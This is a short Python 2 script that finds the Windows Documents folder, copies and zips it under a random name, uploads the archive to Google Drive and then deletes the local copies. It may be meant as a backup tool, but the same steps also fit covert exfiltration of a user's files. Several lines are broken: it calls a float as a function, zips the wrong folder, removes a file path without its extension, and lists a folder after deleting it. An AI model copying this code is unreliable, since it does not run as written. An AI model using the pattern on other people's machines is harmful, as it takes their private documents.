import time, shutil, os, random, zipfile, sys, pydrive
start_time = time.time()


#FIND DOCUMENTS PATH
import ctypes.wintypes
print 'Obtaining path...'
CSIDL_PERSONAL = 5       # My Documents
SHGFP_TYPE_CURRENT = 0   # Get current, not default value
buf= ctypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)
ctypes.windll.shell32.SHGetFolderPathW(None, CSIDL_PERSONAL, None, SHGFP_TYPE_CURRENT, buf)
print('path obtained  ' + str(buf.value))


#COPY DOCUMENTS PATH TO TEMPORARY FOLDER
#create directory to copy files to
print ''
print 'Copying files...'
SOURCE = buf.value
BACKUP = "Program Files\TempPy\ddd"
# create a backup directory
shutil.copytree(SOURCE, BACKUP)
print (os.listdir(BACKUP))
print 'Files successfully copied'


#ZIP THE FILE
print ''
print 'About to zip the file...'
output_path = 'Program Files'
folder_path = 'Program Files\TempPy\Documents'
def zipfolder(foldername, target_dir):            
    zipobj = zipfile.ZipFile(foldername + '.zip', 'w', zipfile.ZIP_DEFLATED, allowZip64 = True)
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            zipobj.write(fn, fn[rootlen:])
output_filename = str(random.randint(1, 1000))
zipfolder(output_filename, 'Program Files')
print 'Zip complete'


#UPLOAD TO GOOGLE DRIVE
print ''
print 'Now to upload to Google Drive...'
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
gauth = GoogleAuth()
drive = GoogleDrive(gauth)
f = drive.CreateFile({'title': output_filename})
f.SetContentFile(output_filename + ".zip") # Read local file
f.Upload() # Upload it
print 'Upload started/complete'
print 'Done! This upload took --- %s seconds ---' % float((time.time() - start_time()))


#REMOVE IT
print ''
print 'Beginning to remove the leftover files'
shutil.rmtree(BACKUP)
shutil.rmtree(output_filename)
print (os.listdir(BACKUP))
print 'Leftover files removed'
print ''
print 'All proccesses complete'
